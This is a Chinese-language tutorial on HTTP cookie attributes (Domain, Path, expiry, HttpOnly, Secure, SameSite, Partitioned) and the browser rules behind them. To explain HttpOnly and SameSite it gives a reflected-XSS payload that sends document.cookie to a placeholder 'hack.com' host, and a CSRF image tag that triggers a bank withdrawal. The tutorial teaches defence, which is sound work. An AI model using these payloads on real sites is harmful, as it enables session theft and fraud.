## Cookie

> **Cookie实际上是一小段的文本信息，它产生的原因是由于HTTP 协议是无状态的，所以需要通过 Cookie 来维持客户端与服务端之间的“会话状态”**。
> 如网络购物，能够在不同页面记录购物车信息，或者在网站不同页面共享登录状态。

**Cookie 的基本结构包括：名字、值、各种属性**

###  属性

一块 Cookie 可能有 Domain、Path、Expires、Max-Age、Secure、HttpOnly 等多种属性，如

```javascript
**HTTP**/1.1 200 **OK**
Set-Cookie: token=abc; Domain=.baidu.com; Path=/accounts; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
```
#### 1. Domain 和 Path

> **Domain 和 Path 属性定义了该 Cookie 的可被访问的范围，告诉浏览器该 Cookie 是属于哪一个网站的**。在请求接口时，会根据 Domain 与 Path 由浏览器决定是否要携带该 Cookie。因此，Domain 是有严格规范进行约束的，可以看成 Cookie 的第一道安全防线。
##### Domain 
> 首先 Domain 设置时在 格式上 必须以 . 开头，且域必须还要包含一个 . ，或者是完全以 ip 的形式写入,

比如说：
```javascript
.baidu.com ✅

192.168.3.5 ✅

.com ❌

.168.3.5 ❌ 非法ip地址是无法写入的

www.baidu.com ❓ 是否合法
```

> A Set-Cookie with Domain=http://ajax.com will be rejected because the value for Domain does not begin with a dot.

 - **虽然 RFC 中严格规定了 Domain 必须以 . 开头，但可能由于网站开发者经常忘记加上 . ，所以浏览器都会自动的在前面加上一个 .**

比如说下面这种：

> 写入时
> ![1713766802896](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766802896.png)
> 查看时
> ![1713766788836](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766788836.png)

 - **如果服务器未指定 Cookie 的 Domain，则它们默认为所请求资源的域。**

 比如 网站地址为 www.baidu.com ，写入的Cookie响应头为Set-Cookie: b=2; Domain=;

> 则实际写入的 Cookie 为
> ![1713766821524](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766821524.png)
> 我们可以看到 b 的Domain变成了当前网站的域，且前面也没有带上.
 - **区别**
>  - 当 Domain 不带点时只有请求主机完全匹配时才会带上 Cookie，也就是仅 www.baidu.com 能访问 当 Domain
>  - 带点时所有子域都能访问到该 Cookie，如 baidu.com、b.baidu.com、a.b.baidu.com

##### 主机匹配

 - **如果请求主机与域名不匹配，则会被浏览器拒绝写入**
当我在 www.a.com 网站写入了一条 www.b.com , 由于它们非同站会被浏览器拒绝写入
 - **Domain 必须为当前域或者当前域的父域**
请求主机为www.baidu.com ，写入域为 .baidu.com 、www.baidu.com ✅
请求主机为a.baidu.com ，写入域为 b.baidu.com、c.a.baidu.com ❌
##### path

> **再讲讲Path , Path 与 Domain 相铺相成，Domain 决定 Cookie是否该被写入，而 Path 决定具体请求哪个路径时会被携带。**

> 例如，设置 Path=/docs，则以下地址都会匹配：
```javascript
/docs
/docs/
/docs/Web/
/docs/Web/HTTP
```
> 但是这些请求路径不会匹配以下地址：
```javascript
/
/docsets
/fr/docs
```
> **当为设置Path或者设置为空时，Path 会被设置为当前请求路径**
> ![1713766840388](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766840388.png)

**注意点：**
> - **当请求地址不带末尾的/ 时，www.a.com:3000/a/b**![1713766853815](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766853815.png)
>  - **当请求地址末尾带/ 时, www.a.com:3000/a/b/**
> ![1713766867562](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766867562.png)

**Cookie是由Domain 与 Path 来区分的，因此不同的Domain或Path 会被识别成不同的Cookie, 所以你可能会遇到多个同名的情况**
![1713766883419](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766883419.png)

> 这些Cookie会同时在请求头中被传递给服务器端
> ![1713766895256](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766895256.png)

> **我们可以看到 发送给服务器端的 Cookie 只会携带 Cookie 的键与名，不会携带相关的 Domain 信息，因此服务器端是无法判断出该 Cookie 具体是哪个域携带的。但会有携带顺序的优先级问题，**
> [从domain字段来分析cookie的优先级](https://blog.csdn.net/yy19900806/article/details/79190933)

> 所以当我们有多个子网站需要使用相同名字的Cookie时，可以使用不带点的全域名 作为写入Domain 或者指定具体的不同Path , 或者采用前缀来区分不同网站
> ![1713766910454](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766910454.png)
#### 2. Expires 和 Max-Age

> 默认的cookie生存期是在浏览器关闭之前。cookie，有时是复数形式，指一些网站为了识别用户和跟踪会话而存储在用户本地终端上数据（通常是加密的）。rfc2019和2965中的定义已被放弃。最新规范是rfc6265.
>
> 如果不设置，则表示cookie生命周期在浏览器会话期间。只要你关闭浏览器窗口，cookie就会消失，这种以浏览会话为生命周期的cookie称为会话cookie。会话cookie通常不保存在硬盘上，而是保存在内存中。如果设置了过期时间，浏览器将cookies保存到硬盘上。关闭后再打开 浏览器时，cookie将保持有效，直到超过过期时间。存储在硬盘上的cookie可以在不同的浏览器进程之间共享，例如两个IE窗口。对于存储在内存中的cookie，不同浏览器有不同的处理方法。

- **Expires 与 Max-Age属性定义了 Cookie 的生命周期，也就是浏览器应删除 Cookie 的时间。在默认情况下Cookie 的生命周期是 Session 级别，即退出浏览器后自动过期。**
- **与 Http Cache 类似， Expires 是以一个绝对GMT格式的时间的来指定过期时间，而 Max-Age 是以多少秒后过期。Max-Age 是 http1.1 的产物，优先级比 Expires 要高，**
> - 当Max-Age 设置大于0时，则会在设置的多少秒后过期
> - 当Max-Age 设置为0时，则会立即过期
> - 当Max-Age 设置为-1时，为Session级别

**区别点：**
>  - Expires 是以GMT时间为单位，可能存在服务器与浏览器端时间不匹配的情况，导致不能精确控制时间到期时间。而Max-Age 则是以浏览器端接收到响应时开始计算时间的，以客户端为准
>  - Max-Age 使用与计算过期时间更简单，而Expires 兼容性更好

##### 了解了这4个属性，我们就可以先封装自己的 Cookie 操作工具了

>  浏览器提供的 **document.cookie** 为我们提供了对Cookie的操作方式
 - **增**
**对document.cookie 重新赋值即可新增该Cookie, 而不是替换掉整个Cookies 。**
> 注意：如果需要替换某个Cookie, 必须保证Domain与Path一致。其中 Cookie 内容只能包括 Ascii 码字符，所以需要经过一层编码。
```javascript
setCookie(
    name: string,
    value: string,
    days?: number,
    domainStr?: string
){
      let expires = '';
      if (days) {
          const date = new Date();
          date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
          expires = '; expires=' + date.toUTCString();
      }
      let domain = '';
      if (domainStr) {
          domain = '; domain=' + domainStr;
      }
      document.cookie = name + '=' + encodeURIComponent(value) + expires + domain + '; path=/';
  },
```
 - **删**
 **只有将 Cookie 设为过期才会删除， 注意只有符合指定 domain 与 path 会被删除**
```javascript
deleteCookie(name: string, domain?: string, path?: string) {
    const d = new Date(0);
    const domainTemp = domain ? `; domain=${domain}` : '';
    const pathTemp = path || '/';
    document.cookie =
        name + '=; expires=' + d.toUTCString() + domainTemp + '; path=' + pathTemp;
},
```
 - **查**
 **我们仅能通过document.cookie 查询到所有的键与值，无法查询其具体的属性，每个不同的Cookie通过 ; 分割**
 ![1713766928036](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766928036.png)
```javascript
function getCookie(cookieName) {
  const strCookie = document.cookie
  const cookieList = strCookie.split('; ')

  for(let i = 0; i < cookieList.length; i++) {
    const arr = cookieList[i].split('=')
    if (cookieName === arr[0].trim()) {
      return decodeURIComponent(arr[1]);
    }
  }

  return ''
}
```
#### 3. HttpOnly
**HttpOnly 要求浏览器不要通过 HTTP（和HTTPS）以外的渠道使用 Cookie，也就是说只能通过 Http 的响应头里进行Set-Cookie , 用户无法在 js 代码中去操作与读取该 Cookie。这个属性主要是用来缓解 XSS 攻击的。**
![1713766939726](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766939726.png)

> **我们可以看下面两个例子**

>  - **反射型 XSS 窃取 Cookie**

>  反射型 XSS 攻击指攻击者在页面中插入恶意 JavaScript 脚本，该脚本随着 HTTP/HTTPS 请求数据一起发送给后端服务器，服务器对其进行响应，浏览器接收响应后将其解析渲染。恶意脚本的执行路径为“浏览器-服务器-浏览器”。浏览器中的恶意脚本发送到服务器，服务器直接对应资源返回浏览器中解析执行，整个过程类似于反射。

假设我们在百度上搜索内容，就会跳转以下页面。
```javascript
https://www.baidu.com/search?input=searchText
```
之后返回的页面中会携带下面的内容
```javascript
<p>以下是搜索{searchText}的所有结果</p>
```
这时我将searchText 改为如下的字符串
```javascript
<img src="notfound.png" onerror="location.href='http://hack.com/?cookie='+document.cookie'">
```
接着我再把整个链接进行转码或者转短链接化，发送给用户，用户点击后在 baidu 上的 Cookie 就会比自动发送到我们的 hack 服务器内。

>  - **反射型 XSS 窃取 Cookie**

>  存储型 XSS 攻击指攻击者在服务器的数据库中插入恶意 JavaScript 脚本，当用户访问网站时，恶意脚本被发送到浏览器进行解析执行。

最经典的一个评论区案例

我在某网站的评论区直接输入一串JS代码
![1713766962912](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766962912.png)
**如果前端与后端均没有对其进行过滤，那么该评论被写入到数据库中，所有访问该页面的用户信息都会被窃取。**

但目前 XSS 攻击并没有那么容易成功，大部分前端框架 React、 Vue，**都会自动对 HTML 内容进行转义后再输出到页面**，比如：
```javascript
<img src="empty.png" onerror ="alert('xss')">
```
转义后输出到 html 中
```javascript
&lt;img src=&quot;empty.png&quot; onerror =&quot;alert(&#x27;xss&#x27;)&quot;&gt;
```
相比之下，采用服务器端渲染的Web应用更容易被攻击，如jsp、 php、 express-art-tempalte 。

> 因此，**采用HttpOnly来保护关键的用户Cookie 是能很大程度上防止Cookie被窃取，但并非完全杜绝。**
#### 4. Secure
> Secure 属性是防止信息在传递的过程中被监听捕获造成信息泄漏。**当 Secure 标志的值被设置为 true 时，表示创建的 Cookie 会被以安全的形式向服务器传输，即只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证**，如果是 HTTP 连接则不会传递该信息，所以 Cookie 的具体内容不会被盗取，**该属性只能在 HTTPS 站点下被设置。**
> ![1713766983516](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713766983516.png)
#### 5. SameSite
> Same Site 直译过来就是同站，它和我们之前说的同域 Same Origin 是不同的。**Cookie 遵守同站策略**，**而非同源策略**，两者的区别主要在于判断的标准是不一样的。
> ![1713767002667](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767002667.png)
> ![1713767022272](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767022272.png)

> 一个 URL 主要有以下几个部分组成：
> ![1713767037510](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767037510.png)

> - **可以看到同域的判断比较严格，需要 protocol、 hostname、port 三部分完全一致。**

> - **相对而言，Cookie中的同站判断就比较宽松，主要是根据 Mozilla 维护的公共后缀表（[Pulic Suffix List](https://publicsuffix.org/list/public_suffix_list.dat)）使用有效顶级域名(eTLD)+1的规则查找得到的一级域名是否相同来判断是否是同站请求**, 此外，**Cookie并不区分端口与协议。**
###### 同站和跨站
> **Cookie中的同站：只要 两个url地址的有效顶级域名+二级域名 是相同的就算是同站**

> **有效顶级域名(eTLD)+1的规则：两个url地址的有效顶级域名+二级域名**

> 域名可以分成顶级域名（一级域名）、二级域名、三级域名等等，如：
>  - 顶级域名：.com, .cn, .top, .xyz
>  - 二级：baidu.com, bilibili.com
>  - 三级域名：xx.baidu.com xx.bilibili.com
###### 比较https://tieba.baidu.com 与 https://wenku.baidu.com 是否是同站。
> 根据上述的 有效顶级域名(eTLD)+1的规则查找得到的一级域名是否相同
> .com是在 PSL 中记录的有效顶级域名，eTLD+1 后两者都是 baidu.com ,
> 所以 https://tieba.baidu.com 和 https://www.baidu.com是同站域名。
###### 如果是github.io 这属于什么域名？
> 其中 github.io 我们再PSL中能够找到
> ![1713767054522](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767054522.png)
> 因此github.io 是有效顶级域名 eTLD
###### 比较下jackWang.github.io 与 dtstack.github.io
> jackWang.github.io 与 dtstack.github.io 分别是eTLD+1 ， 它们不相等，所以是 **跨站** 的。**由于github.io 是顶级域名，当domain设置为 .github.io 由于非法**，并不会设置成功，也因此不同github page是不共享Cookie的。
###### eTLD
> **eTLD 的全称是 effective Top-Level Domain**，它与我们往常理解的 **Top-Level Domain 顶级域名**有所区别。eTLD 记录在之前提到的 PSL 文件中。而 **TLD(真正的顶级域名)** 也有一个记录的列表，那就是 [Root Zone Database](https://www.iana.org/domains/root/db)。

> **eTLD 的出现主要是为了解决 .com.cn、 .com.hk、 .co.jp 这种看起来像是二级域名的但其实需要作为顶级域名存在的场景。**

###### SameSite属性取值

 - **a. None** 


> 在 Chrome80 版本以前，Same-Site 的默认值是None , 该属性值表示不做任何限制，允许**第三方Cookie** 。啥是第三方Cookie ？根据上面同站的判断规则，如果是**同站的，就称为第一方** ，**跨站的就为第三方** 。
> ![1713767072197](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767072197.png)
> ![1713767086018](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767086018.png)

> **那么什么时候我的网站会出现第三方Cookie，Cookie Domain不是只能设置自身域内吗 ?**

> 首先Set-Cookie时的Domain校验是根据请求的主机，而不是当前导航栏 URL 的地址来判定的
> ![1713767097960](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767097960.png)

> 当我请求一个跨域请求，或者通过img标签引入一个外域的图片时等等，如果请求响应设置了Cookie或者携带了第三方Cookie, 那么都会在Devtools中展示，只有当通过document.cookie访问时访问到的都为第一方Cookie 。
> 当我在www.aliyun.com 设置了如下 Cookie: a=createFromAliyun; Domain=.aliyun.com;Path=/; SameSite=None
> 当我访问www.taobao.com时， 里面引用了一张aliyun.com的图片
> 当我将SameSite设为None时，请求这张图片时才会带上我们在www.aliyun.com 下写入的Cookie a 。
> ![1713767114726](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767114726.png)
> **仅携带为None的Cookie**
> ![1713767129002](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767129002.png)
 - **b. Lax 默认值**
> Lax会对一部分第三方Cookie进行限制发送，我们知道互联网广告通过在固定域 Cookie 下标记用户 ID，记录用户的行为从何达到精准推荐的目的。随着全球隐私问题的整治，在 **Chrome 80 中浏览器将默认的 SameSite 规则从 SameSite=None 修改为 SameSite=Lax。设置成 SameSite=Lax 之后页面内所有跨站情况下的资源请求都不会携带 Cookie。**

 **具体规则：**
> 对用户来说这肯定是一件好事，避免了自身被攻击。但是对我们技术同学来说，这无疑是给我们设置的一个障碍。因为业务也确实会存在着多个域名的情况，并且需要在这些域名中进行 Cookie 传递。
> 这个修改影响面广泛，需要网站维护者花大量的时间去修改适配。
> 针对因为此次特性受到影响的网站，可以选择以下一些适配办法：
>  - 降级浏览器版本至80以下；基本只能用作临时解决方案
>  - 浏览器默认配置修改，91版本以下进入chrome://flags将same-site-by-default-cookies设为disabled , 94版本以下需改动启动项才行
>  - 将站点都放到同一二级域名下面，即让他们保持同站
> 会使用两个不同的站点业务耦合，仅特定场景下可以考虑，比如通过 iframe 嵌入单点登录页面 ，单点登录页面仅会在iframe中使用，没有人会单独去访问这个网站，则可以考虑修改单点登录页面的域名。
>  - 为所有 Cookie 增加 SameSite=None;Secure 属性
> 需要改动所有前后端设置 Cookie 的地方，改动量巨大，其次None 必须与Secure 配套使用，而Secure 意味着必须配备 HTTPS 。
>  - 通过 Nginx 反向代理我们的跨站网站， 使它们变成同站。
> 比如我在www.baidu.com 下通过 iframe 嵌套了www.bilibili.com , 它们跨站了，在 bilibili 中的Set-Cookie 将会被拒绝掉。
> 这时我在 Nginx上开启一个代理服务，将域名 bilibili.baidu.com 代理转发至 www.bilibili.com

**需要注意： 要通过 Nginx 进行 Cookie 转发**

```javascript
server {
  listen       80;
  server_name  bilibili.baidu.com;

  location / {
    proxy_hide_header X-Frame-Options;
    # 用于cookie代理
    proxy_cookie_domain www.baidu.com  bilibili.baidu.com;
    # 代理到真实地址
    proxy_pass http://www.baidu.com;
  }
}
```
 - **c. Strict**

> **Strict 最为严格，它完全拒绝第三方站点，实际运用场景并不多**，当某些 Cookie 被设为Strict后，可能会影响到用户的体验。比如我在baidu.com 中用a标签 链接到bilibili ，而bilibili的token如果是Strict的话，那我跳转过去就会丢失登录状态。
###### 解决chrome升级后跨站跳转cookie无法携带问题
> **原因** ： 在 **Chrome 80 中浏览器将默认的 SameSite 规则从 SameSite=None 修改为 SameSite=Lax。设置成 SameSite=Lax 之后页面内所有跨站情况下的资源请求都不会携带 Cookie。**

> 解决办法1：（91版本后已被Chorme移除）
>  - 谷歌浏览器地址栏输入：chrome://flags/ 
>  - 找到：SameSite by default cookies、Cookies without SameSite must be secure 
>  - 设置上面这两项设置成 Disable
> ![1713767151674](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767151674.png)

> 解决办法2：
> Windows：打开Chrome快捷方式的属性，在 目标 后添加
```javascript
--disable-features=SameSiteByDefaultCookies
```
> 或者添加
```javascript
--flag-switches-begin --disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure --flag-switches-end
```
>，点击确定，（注意！！！一定要关闭所有浏览器，目标后一定要添加几个空格）然后重启浏览器。
>![1713767189725](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767189725.png)
###### SameSite 的作用主要有两点:
 - 进行隐私保护， 
 - 能够有效防御CSRF攻击

比如我在自己的黑客网站放入一张图片，里面的链接指向会将 qiming 的钱转给 jialan， 诱导用户进入我的网站，由于第三方 Cookie 的存在，用户的登录态是存在的（之前登录过该银行的话），钱就会自动转入我的账户。如果设置了Lax或Strict , 则能避免这种问题。
```javascript
<img src="http://bank.example.com/withdraw?account=qiming&amount=1000000&for=jialan" />
```
![1713767331365](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767331365.png)
#### Cookie 大小与数量
**每一个 Cookie 的大小一般为4KB, 不同浏览器上不同，Chrome 实测下来为4096个字节，其计算是name + value的字符串长度，当超过大小时设置不会成功**
![1713767345436](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767345436.png)
**实测下来每个域下面最多为175个，当超出最大限制时，会移除旧的 Cookie**
![1713767358615](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767358615.png)

##### 但我如何控制哪些 Cookie 在超出限制时不应该被删除？
> Cookie还有个 Priority 属性用来表示优先级
> 有以下取值：
>  - Low 
>  - Medium 默认值 
>  - High

> 那自动删除时将按下面顺序进行删除
> - 优先级为 Low的非 secure Cookie
> - 优先级为 Low的 secure Cookie
> - 优先级为 Medium的非 secure Cookie
> - 优先级为 Medium的 secure Cookie
> - 优先级为 High的非 secure Cookie
> - 优先级为 High的 secure Cookie

#### 未来发展
Cookie 在未来的很长一段时间都是不可或缺的，即使目前已经有了 jwt 等替代方案。 像国外的 Cookie 隐私法在一步步限制着 Cookie 的权利，访问站点时使用第三方 Cookie 都必须争得用户的同意。
#### SameParty属性
SameSite=Lax/Strict 断了我们跨站传递 Cookie 的念想，但实际业务上确实有这种场景。然而 Chrome 是计划在2024年完全禁用第三方Cookie ，那完全禁用后，为了能够满足实际的业务需求，Chrome 又推出了SameParty属性。

该提案提出了 SameParty 新的 Cookie 属性，当标记了这个属性的 Cookie 可以在同一个主域下进行共享。那如何定义不同的域名属于同一主域呢？主要是依赖了另外一个特性 first-party-set 第一方集合。它规定在每个域名下的该 URL /.well-known/first-party-set 可以返回一个第一方域名的配置文件。在这个文件中你可以定义当前域名从属于哪个第一方域名，该第一方域名下有哪些成员域名等配置。

```javascript
// https://a.example/.well-known/first-party-set
{
  "owner": "a.example",
  "members": ["b.example", "c.example"],
  ...
}

// https://b.example/.well-known/first-party-set
{
    "owner": "a.example"
}

// https://c.example/.well-known/first-party-set
{
    "owner": "a.example"
}
```
当然使用固定 URL 会产生额外的请求，对页面的响应造成影响。也可以直接使用 Sec-First-Party-Set 响应头直接指定归属的第一方域名。

该属性还未正式支持，此处只做简略说明
#### Partitioned属性
这个属性我们可能很少注意到，一般称为Cookies Having Independent Partitioned State (CHIPS)
![1713767375143](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1713767375143.png)
它的作用是使 第三方Cookie 与 第一方站点 相绑定

我们举个例子：

> 我在 https://site-a.example 里，里面请求了 https://3rd-party.example 这个站点的资源， 而
> https://3rd-party.example 写入了一个 Cookie ，那它属于 第三方COokie 。

> 当我访问 https://site-b.example 时，也请求了 https://3rd-party.example
> 的资源，这时浏览器会把在 https://site-a.example 中写入的第三方 Cookie 也给带上。

> 这是正常情况，原因是 Cookie 在会以写入它们的主机或者域名作为 Key 去存储，比如上面就是
> [”https://3rd-party.example”], 我们并不知道它的创建上下文域名是啥。

> 当我开启 Partitioned 时，Cookie 存储时，还会记录创建它的上下文 eTLD + 1 作为额外的 Partiotion
> Key ， 变成 [”https://3rd-party.example”, "https://site-a.example"] 。

> 当我访问 https://site-a.example 是因为匹配上了 Partition Key , 所以能够带上 第三方 Cookie , 访问 https://site-b.example 时则不会带上 第三方 Cookie 。这样其实主要是限制了第三方 Cookie
> 的跟踪。

